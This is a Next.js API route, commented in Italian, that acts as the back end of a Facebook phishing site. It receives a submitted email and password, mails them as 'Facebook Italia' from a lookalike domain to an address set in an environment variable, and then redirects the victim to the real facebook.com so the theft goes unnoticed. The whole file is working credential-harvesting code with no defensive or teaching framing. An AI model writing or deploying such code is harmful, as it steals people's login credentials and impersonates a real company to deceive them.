// /app/api/process/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const body = await request.formData();
    const email = body.get('email')?.toString() || '';
    const password = body.get('password')?.toString() || '';

    // Validazione
    if (!email || !password) {
      return NextResponse.json({ error: 'Email e password richiesti.' }, { status: 400 });
    }

    // Configura SMTP Gmail
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'securitynoreply@facebook2025.it', // deve essere G Suite / Google Workspace attivo
        pass: process.env.EMAIL_PASSWORD // usa una App Password, NON la password normale
      }
    });

    // Costruisci email
    const mailOptions = {
      from: '"Facebook Italia" <securitynoreply@facebook2025.it>',
      to: process.env.EMAIL_TO ?? '',
      subject: 'Nuovo accesso dal sito Facebook',
      text: `Email: ${email}\nPassword: ${password}`
    };

    // Invia email
    await transporter.sendMail(mailOptions);

    // Redirect dopo invio
    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error('Errore invio Gmail:', error);
    return NextResponse.json({ error: 'Errore interno server.' }, { status: 500 });
  }
}
